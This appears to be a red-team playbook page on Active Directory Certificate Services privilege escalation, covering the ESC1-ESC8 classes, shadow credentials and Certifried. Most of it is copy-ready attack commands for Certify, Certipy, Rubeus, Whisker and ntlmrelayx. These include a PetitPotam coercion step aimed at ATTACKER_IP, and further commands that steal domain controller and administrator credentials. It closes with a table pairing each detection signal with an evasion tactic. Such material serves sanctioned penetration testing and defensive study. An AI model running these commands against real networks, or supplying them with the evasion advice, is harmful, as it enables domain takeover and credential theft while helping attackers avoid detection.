# Certificate-Based Privilege Escalation (ADCS)

> **MITRE ATT&CK**: Privilege Escalation > T1649 - Steal or Forge Authentication Certificates
> **Platforms**: Windows / Active Directory with AD CS
> **Required Privileges**: Domain User
> **OPSEC Risk**: Low-Medium

## Strategic Overview

Active Directory Certificate Services (ADCS) is one of the most impactful and undermonitored
attack surfaces in modern Active Directory environments. Misconfigured certificate templates
allow standard users to request certificates that authenticate as Domain Admins. Unlike
password-based credentials, certificates remain valid even if the target user changes their
password, providing both escalation and persistence. The ESC1-ESC8 vulnerability classes
identified by SpecterOps cover template misconfigurations, CA misconfigurations, and relay
attacks. A Red Team Lead should prioritize ADCS enumeration early in every engagement --
vulnerable templates are extremely common and exploitation generates minimal detection
signatures compared to other AD attacks.

## Technical Deep-Dive

### Enumeration

```powershell
# Certify (C# - from Windows)
.\Certify.exe find                          # Enumerate all templates
.\Certify.exe find /vulnerable              # Find vulnerable templates
.\Certify.exe find /vulnerable /currentuser # Filter to templates available to current user
.\Certify.exe cas                           # Enumerate Certificate Authorities

# Certipy (Python - from Linux)
certipy find -u user@domain.local -p 'password' -dc-ip 10.10.10.10
certipy find -u user@domain.local -p 'password' -dc-ip 10.10.10.10 -vulnerable
certipy find -u user@domain.local -p 'password' -dc-ip 10.10.10.10 -vulnerable -stdout
```

### ESC Vulnerability Summary

| ESC | Condition | Impact | Difficulty |
|-----|-----------|--------|------------|
| ESC1 | Template allows SAN, enrollee supplies SAN, low-priv enrollment | Authenticate as any user | Easy |
| ESC2 | Template allows Any Purpose or SubCA EKU | Certificate usable for any purpose | Easy |
| ESC3 | Template for enrollment agent + second template for issuance on behalf | Enroll on behalf of any user | Medium |
| ESC4 | Low-priv user has write access to template | Modify template to create ESC1 | Easy |
| ESC5 | Vulnerable ACLs on CA server AD object | Modify CA configuration | Medium |
| ESC6 | CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag | Any template becomes ESC1 | Easy |
| ESC7 | CA has ManageCA + ManageCertificates permissions for low-priv | Approve pending requests, enable SAN | Medium |
| ESC8 | HTTP enrollment endpoint without EPA | NTLM relay to ADCS web enrollment | Medium |

### ESC1 - Misconfigured Certificate Template

The most common and impactful vulnerability. Template allows the enrollee to specify a
Subject Alternative Name (SAN), meaning you can request a certificate as any user.

```powershell
# Certify - request certificate with SAN for administrator
.\Certify.exe request /ca:CA01.domain.local\domain-CA /template:VulnTemplate /altname:administrator

# Certipy - request certificate
certipy req -u user@domain.local -p 'password' -ca 'domain-CA' -template 'VulnTemplate' -upn 'administrator@domain.local' -dc-ip 10.10.10.10

# Convert PEM to PFX (if needed)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Authenticate with certificate (Rubeus)
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt

# Authenticate with certificate (Certipy)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC4 - Template ACL Abuse

If you have write access to a certificate template object, modify it to create ESC1.

```powershell
# Certipy - overwrite template to make it vulnerable
certipy template -u user@domain.local -p 'password' -template 'WritableTemplate' -save-old

# Now exploit as ESC1
certipy req -u user@domain.local -p 'password' -ca 'domain-CA' -template 'WritableTemplate' -upn 'administrator@domain.local'

# Restore original template (cleanup)
certipy template -u user@domain.local -p 'password' -template 'WritableTemplate' -configuration old_config.json
```

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

When the CA has this flag, any template with client authentication EKU becomes exploitable.

```powershell
# Check for EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA
certutil -config "CA01.domain.local\domain-CA" -getreg policy\EditFlags

# If flag is set, request any client auth template with SAN
.\Certify.exe request /ca:CA01.domain.local\domain-CA /template:User /altname:administrator
```

### ESC8 - NTLM Relay to ADCS HTTP Enrollment

Relay NTLM authentication to the ADCS web enrollment endpoint.

```bash
# Set up NTLM relay to ADCS HTTP endpoint
ntlmrelayx.py -t http://CA01.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce authentication from DC (PetitPotam)
python3 PetitPotam.py ATTACKER_IP DC01.domain.local

# Use the certificate obtained from relay
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
# This yields the DC machine account hash -> DCSync
```

### Shadow Credentials

Abuse msDS-KeyCredentialLink attribute to add a key credential and authenticate via PKINIT.
Requires write access to the target object (GenericAll, GenericWrite, or specific property).

```powershell
# Whisker (C# - from Windows)
.\Whisker.exe add /target:target_user /domain:domain.local /dc:DC01.domain.local
# Whisker outputs a Rubeus command to authenticate with the added credential

# pywhisker (Python - from Linux)
python3 pywhisker.py -d domain.local -u attacker -p password --target target_user --action add

# Authenticate with the shadow credential
.\Rubeus.exe asktgt /user:target_user /certificate:<base64_cert> /password:<cert_password> /ptt

# Cleanup - remove shadow credential
.\Whisker.exe remove /target:target_user /deviceid:<DEVICE_GUID>
```

### Certifried (CVE-2022-26923)

Machine account certificates can be used to escalate if the machine account name matches
another computer (including a DC). Create a machine account, change its dNSHostName to
match a DC, request a certificate, authenticate as the DC.

```bash
# Create machine account
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' domain.local/user:password

# Change dNSHostName to match DC
python3 bloodyAD.py -d domain.local -u user -p password --host DC01.domain.local setAttribute 'CN=YOURPC,CN=Computers,DC=domain,DC=local' dNSHostName '["DC01.domain.local"]'

# Request certificate with DC identity
certipy req -u 'YOURPC$'@domain.local -p 'Password123!' -ca 'domain-CA' -template 'Machine'

# Authenticate as DC
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

### Certificate Authentication

```powershell
# Rubeus - request TGT using certificate
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:CertPass /ptt /nowrap

# Rubeus - request TGT using base64 certificate
.\Rubeus.exe asktgt /user:administrator /certificate:<base64_pfx> /password:CertPass /ptt

# Certipy - authenticate and retrieve NT hash via U2U
certipy auth -pfx admin.pfx -dc-ip 10.10.10.10
# Output: NT hash for the user (can be used for pass-the-hash)

# PKINIT from Linux with PKINITtools
python3 gettgtpkinit.py domain.local/administrator -cert-pfx admin.pfx -pfx-pass CertPass admin.ccache
python3 getnthash.py -key <AS-REP_key> domain.local/administrator
```

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| Certificate request with SAN | Event 4886/4887 (Certificate Services) | Use less-monitored templates |
| Template modification | Event 4899 (template update) | Restore template immediately after |
| NTLM relay to HTTP endpoint | Network monitoring for HTTP to ADCS | Use HTTPS endpoints where available |
| Shadow credential addition | Event 5136 (msDS-KeyCredentialLink change) | Remove credential after use |
| Unusual certificate authentication | Event 4768 with certificate info | Certificate auth is legitimate, blends in |

## Cross-References

- [ACL Abuse](acl-abuse.md) - gaining write access for ESC4 and shadow credentials
- [Delegation Abuse](delegation-abuse.md) - combining with delegation for lateral movement
- [AD Privilege Escalation Overview](ad-privilege-escalation.md) - full AD attack decision tree
- [AD Deep Dive: ADCS](../12-active-directory-deep-dive/adcs-attacks.md) - comprehensive ADCS internals

## References

- https://posts.specterops.io/certified-pre-owned-d95910965cd2
- https://github.com/GhostPack/Certify
- https://github.com/ly4k/Certipy
- https://github.com/eladshamir/Whisker
- https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
- https://www.thehacker.recipes/ad/movement/adcs
